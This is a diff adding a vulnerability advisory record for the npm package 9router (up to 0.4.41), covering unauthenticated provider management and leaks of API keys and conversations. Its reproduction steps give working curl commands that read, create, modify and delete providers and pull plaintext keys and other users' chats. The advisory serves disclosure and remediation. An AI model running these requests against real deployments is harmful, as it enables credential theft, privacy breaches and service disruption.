@@ -1,0 +1,360 @@
+advisory_id: GHSA-vjc7-jrh9-9j86
+datasource_id: github_osv/GHSA-vjc7-jrh9-9j86
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-vjc7-jrh9-9j86/GHSA-vjc7-jrh9-9j86.json
+aliases: []
+summary: |
+  9router has unauthenticated CRUD on /api/providers and Full API Key Leak via /api/usage/stats
+  ---
+  title: Unauthenticated CRUD on /api/providers and Full API Key Leak via /api/usage/stats
+  product: 9Router
+  version: <= 0.4.41
+  severity: critical
+  cve_request: true
+  ---
+
+  ## Summary
+
+  Multiple critical API security vulnerabilities were discovered in 9Router's Next.js dashboard. The `/api/providers` endpoints lack authentication entirely, allowing anyone to create, read, update, and delete provider connections. Additionally, `/api/usage/stats` exposes full plaintext API keys, and `/api/usage/request-logs` + `/api/usage/request-details` expose all users' request history and full conversation contents (including system prompts, user messages, assistant responses) without authentication.
+
+  ## Affected Endpoints
+
+  | Endpoint | Method | Issue |
+  |---|---|---|
+  | `/api/providers` | GET | Lists all provider connections with partial credentials, OAuth tokens, account IDs |
+  | `/api/providers/:id` | GET | Read any single provider detail (IDOR) |
+  | `/api/providers` | POST | Create arbitrary provider connections with attacker-controlled API keys |
+  | `/api/providers/:id` | PUT | Modify any existing provider connection |
+  | `/api/providers/:id` | DELETE | Delete any provider connection |
+  | `/api/usage/stats` | GET | Exposes full plaintext API keys, per-account usage breakdown, cost data |
+  | `/api/usage/request-logs` | GET | Exposes all users' request logs (model, tokens, cost, timestamp, provider) |
+  | `/api/usage/request-details/:id` | GET | Exposes full conversation turns including system prompts, user messages, assistant responses |
+  | `/api/version` | GET | Exposes current version info |
+  | `/api/models` | GET | Exposes full model routing catalog |
+  | `/api/v1/models` | GET | Exposes model list |
+
+  ## Impact
+
+  ### Critical: Provider CRUD without authentication
+
+  An attacker can:
+  1. **Add a malicious provider** — inject a provider that proxies through their server, capturing all prompts, responses, and API keys routed through 9Router
+  2. **Modify existing providers** — replace API keys with attacker-controlled ones, redirect traffic
+  3. **Delete all providers** — cause complete denial of service
+  4. **Read all provider configurations** — harvest partial credentials, GitHub Copilot OAuth tokens, Cloudflare account IDs, email addresses
+
+  ### Critical: Full API key leak via /api/usage/stats
+
+  The endpoint returns complete API key strings (e.g., `sk-...`) in plaintext alongside usage data per key, enabling unauthorized use of connected AI provider accounts.
+
+  ### Critical: Conversation history leak
+
+  `/api/usage/request-details` returns the full conversation history of other users' AI sessions, including system prompts, user messages, assistant responses, tool calls, and reasoning traces.
+
+  ## Steps to Reproduce
+
+  ### 1. Unauthenticated read of all providers
+
+  ```bash
+  curl -s https://<host>/api/providers
+  ```
+
+  Returns all provider connections with email addresses, auth type, account IDs, and partial API key prefixes.
+
+  ### 2. Create a provider without authentication
+
+  ```bash
+  curl -X POST https://<host>/api/providers \
+    -H "Content-Type: application/json" \
+    -d '{"provider":"openai","authType":"apikey","name":"rogue","apiKey":"sk-attacker-controlled"}'
+  ```
+
+  Returns the created connection object with a new UUID and `isActive: true`.
+
+  ### 3. Modify an existing provider without authentication
+
+  ```bash
+  curl -X PUT https://<host>/api/providers/<existing-uuid> \
+    -H "Content-Type: application/json" \
+    -d '{"name":"modified","apiKey":"sk-attacker-key"}'
+  ```
+
+  Returns the updated connection object.
+
+  ### 4. Delete a provider without authentication
+
+  ```bash
+  curl -X DELETE https://<host>/api/providers/<existing-uuid>
+  ```
+
+  Returns `{"message":"Connection deleted successfully"}`.
+
+  ### 5. Read full usage stats with API keys
+
+  ```bash
+  curl -s https://<host>/api/usage/stats
+  ```
+
+  Returns full API key strings, per-account token/cost breakdown, recent requests.
+
+  ### 6. Read request logs
+
+  ```bash
+  curl -s "https://<host>/api/usage/request-logs?page=1&pageSize=50"
+  ```
+
+  Returns paginated request logs with timestamps, models, providers, user emails, token counts.
+
+  ### 7. Read full conversation
+
+  ```bash
+  curl -s https://<host>/api/usage/request-details/<request-uuid>
+  ```
+
+  Returns complete conversation turns for that request.
+
+  ### 8. Read version info
+
+  ```bash
+  curl -s https://<host>/api/version
+  ```
+
+  Returns `{"currentVersion":"0.4.19","latestVersion":"0.4.45","hasUpdate":true}`.
+
+  ## Root Cause
+
+  The Next.js API routes under `src/app/api/*` lack authentication middleware on several endpoints. Specifically:
+
+  - `/api/providers/*` — No auth check before CRUD operations on provider connections stored in the database
+  - `/api/usage/stats` — No auth check before returning aggregated usage data including full API keys
+  - `/api/usage/request-logs` — No auth check before returning request history
+  - `/api/usage/request-details/:id` — No auth check before returning full conversation contents
+
+  ## Suggested Fix
+
+  1. Add authentication middleware to all `/api/providers/*` routes (GET, POST, PUT, DELETE)
+  2. Add authentication middleware to all `/api/usage/*` routes
+  3. Never return full API key strings in any API response — return masked keys only
+  4. Never return GitHub Copilot tokens or similar OAuth secrets in API responses
+  5. Implement proper authorization checks so users can only access their own data
+  6. Add rate limiting to public endpoints
+
+  ## Resources
+
+  - https://github.com/decolua/9router
+impacted_packages:
+  - purl: pkg:npm/9router
+    affected_versions: vers:npm/<=0.4.41
+    fixed_versions:
+    affected_packages:
+      - pkg:npm/9router@0.2.13
+      - pkg:npm/9router@0.2.14
+      - pkg:npm/9router@0.2.15
+      - pkg:npm/9router@0.2.16
+      - pkg:npm/9router@0.2.17
+      - pkg:npm/9router@0.2.18
+      - pkg:npm/9router@0.2.19
+      - pkg:npm/9router@0.2.20
+      - pkg:npm/9router@0.2.21
+      - pkg:npm/9router@0.2.22
+      - pkg:npm/9router@0.2.23
+      - pkg:npm/9router@0.2.24
+      - pkg:npm/9router@0.2.25
+      - pkg:npm/9router@0.2.26
+      - pkg:npm/9router@0.2.27
+      - pkg:npm/9router@0.2.29
+      - pkg:npm/9router@0.2.30
+      - pkg:npm/9router@0.2.31
+      - pkg:npm/9router@0.2.32
+      - pkg:npm/9router@0.2.33
+      - pkg:npm/9router@0.2.34
+      - pkg:npm/9router@0.2.36
+      - pkg:npm/9router@0.2.37
+      - pkg:npm/9router@0.2.38
+      - pkg:npm/9router@0.2.39
+      - pkg:npm/9router@0.2.40
+      - pkg:npm/9router@0.2.41
+      - pkg:npm/9router@0.2.42
+      - pkg:npm/9router@0.2.43
+      - pkg:npm/9router@0.2.44
+      - pkg:npm/9router@0.2.45
+      - pkg:npm/9router@0.2.46
+      - pkg:npm/9router@0.2.47
+      - pkg:npm/9router@0.2.48
+      - pkg:npm/9router@0.2.49
+      - pkg:npm/9router@0.2.50
+      - pkg:npm/9router@0.2.51
+      - pkg:npm/9router@0.2.52
+      - pkg:npm/9router@0.2.53
+      - pkg:npm/9router@0.2.54
+      - pkg:npm/9router@0.2.56
+      - pkg:npm/9router@0.2.57
+      - pkg:npm/9router@0.2.58
+      - pkg:npm/9router@0.2.59
+      - pkg:npm/9router@0.2.60
+      - pkg:npm/9router@0.2.61
+      - pkg:npm/9router@0.2.62
+      - pkg:npm/9router@0.2.63
+      - pkg:npm/9router@0.2.64
+      - pkg:npm/9router@0.2.65
+      - pkg:npm/9router@0.2.66
+      - pkg:npm/9router@0.2.67
+      - pkg:npm/9router@0.2.68
+      - pkg:npm/9router@0.2.70
+      - pkg:npm/9router@0.2.71
+      - pkg:npm/9router@0.2.72
+      - pkg:npm/9router@0.2.73
+      - pkg:npm/9router@0.2.74
+      - pkg:npm/9router@0.2.75
+      - pkg:npm/9router@0.2.76
+      - pkg:npm/9router@0.2.77
+      - pkg:npm/9router@0.2.78
+      - pkg:npm/9router@0.2.79
+      - pkg:npm/9router@0.2.80
+      - pkg:npm/9router@0.2.81
+      - pkg:npm/9router@0.2.83
+      - pkg:npm/9router@0.2.84
+      - pkg:npm/9router@0.2.87
+      - pkg:npm/9router@0.2.88
+      - pkg:npm/9router@0.2.89
+      - pkg:npm/9router@0.2.90
+      - pkg:npm/9router@0.2.91
+      - pkg:npm/9router@0.2.92
+      - pkg:npm/9router@0.2.93
+      - pkg:npm/9router@0.2.94
+      - pkg:npm/9router@0.2.95
+      - pkg:npm/9router@0.2.96
+      - pkg:npm/9router@0.2.97
+      - pkg:npm/9router@0.2.98
+      - pkg:npm/9router@0.3.3
+      - pkg:npm/9router@0.3.5
+      - pkg:npm/9router@0.3.6
+      - pkg:npm/9router@0.3.7
+      - pkg:npm/9router@0.3.8
+      - pkg:npm/9router@0.3.9
+      - pkg:npm/9router@0.3.10
+      - pkg:npm/9router@0.3.11
+      - pkg:npm/9router@0.3.12
+      - pkg:npm/9router@0.3.13
+      - pkg:npm/9router@0.3.14
+      - pkg:npm/9router@0.3.15
+      - pkg:npm/9router@0.3.16
+      - pkg:npm/9router@0.3.17
+      - pkg:npm/9router@0.3.19
+      - pkg:npm/9router@0.3.20
+      - pkg:npm/9router@0.3.21
+      - pkg:npm/9router@0.3.22
+      - pkg:npm/9router@0.3.23
+      - pkg:npm/9router@0.3.24
+      - pkg:npm/9router@0.3.27
+      - pkg:npm/9router@0.3.28
+      - pkg:npm/9router@0.3.29
+      - pkg:npm/9router@0.3.30
+      - pkg:npm/9router@0.3.31
+      - pkg:npm/9router@0.3.32
+      - pkg:npm/9router@0.3.33
+      - pkg:npm/9router@0.3.34
+      - pkg:npm/9router@0.3.35
+      - pkg:npm/9router@0.3.36
+      - pkg:npm/9router@0.3.40
+      - pkg:npm/9router@0.3.41
+      - pkg:npm/9router@0.3.42
+      - pkg:npm/9router@0.3.44
+      - pkg:npm/9router@0.3.46
+      - pkg:npm/9router@0.3.47
+      - pkg:npm/9router@0.3.48
+      - pkg:npm/9router@0.3.49
+      - pkg:npm/9router@0.3.50
+      - pkg:npm/9router@0.3.51
+      - pkg:npm/9router@0.3.52
+      - pkg:npm/9router@0.3.53
+      - pkg:npm/9router@0.3.54
+      - pkg:npm/9router@0.3.55
+      - pkg:npm/9router@0.3.56
+      - pkg:npm/9router@0.3.57
+      - pkg:npm/9router@0.3.58
+      - pkg:npm/9router@0.3.60
+      - pkg:npm/9router@0.3.61
+      - pkg:npm/9router@0.3.62
+      - pkg:npm/9router@0.3.63
+      - pkg:npm/9router@0.3.64
+      - pkg:npm/9router@0.3.65
+      - pkg:npm/9router@0.3.66
+      - pkg:npm/9router@0.3.68
+      - pkg:npm/9router@0.3.69
+      - pkg:npm/9router@0.3.70
+      - pkg:npm/9router@0.3.71
+      - pkg:npm/9router@0.3.72
+      - pkg:npm/9router@0.3.74
+      - pkg:npm/9router@0.3.75
+      - pkg:npm/9router@0.3.76
+      - pkg:npm/9router@0.3.78
+      - pkg:npm/9router@0.3.79
+      - pkg:npm/9router@0.3.80
+      - pkg:npm/9router@0.3.81
+      - pkg:npm/9router@0.3.82
+      - pkg:npm/9router@0.3.83
+      - pkg:npm/9router@0.3.84
+      - pkg:npm/9router@0.3.85
+      - pkg:npm/9router@0.3.87
+      - pkg:npm/9router@0.3.89
+      - pkg:npm/9router@0.3.90
+      - pkg:npm/9router@0.3.91
+      - pkg:npm/9router@0.3.96
+      - pkg:npm/9router@0.3.97
+      - pkg:npm/9router@0.3.98
+      - pkg:npm/9router@0.3.99
+      - pkg:npm/9router@0.4.1
+      - pkg:npm/9router@0.4.2
+      - pkg:npm/9router@0.4.3
+      - pkg:npm/9router@0.4.5
+      - pkg:npm/9router@0.4.6
+      - pkg:npm/9router@0.4.8
+      - pkg:npm/9router@0.4.9
+      - pkg:npm/9router@0.4.10
+      - pkg:npm/9router@0.4.11
+      - pkg:npm/9router@0.4.12
+      - pkg:npm/9router@0.4.13
+      - pkg:npm/9router@0.4.14
+      - pkg:npm/9router@0.4.15
+      - pkg:npm/9router@0.4.16
+      - pkg:npm/9router@0.4.17
+      - pkg:npm/9router@0.4.18
+      - pkg:npm/9router@0.4.19
+      - pkg:npm/9router@0.4.20
+      - pkg:npm/9router@0.4.25
+      - pkg:npm/9router@0.4.26
+      - pkg:npm/9router@0.4.27
+      - pkg:npm/9router@0.4.28
+      - pkg:npm/9router@0.4.29
+      - pkg:npm/9router@0.4.31
+      - pkg:npm/9router@0.4.33
+      - pkg:npm/9router@0.4.36
+      - pkg:npm/9router@0.4.37
+      - pkg:npm/9router@0.4.39
+      - pkg:npm/9router@0.4.41
+    fixed_packages: []
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '10.0'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-vjc7-jrh9-9j86/GHSA-vjc7-jrh9-9j86.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-200
+  - CWE-862
+  - CWE-306
+references:
+  - url: https://github.com/decolua/9router
+    reference_type:
+    reference_id:
+  - url: https://github.com/decolua/9router/security/advisories/GHSA-vjc7-jrh9-9j86
+    reference_type: advisory
+    reference_id: GHSA-vjc7-jrh9-9j86
+exploits: []
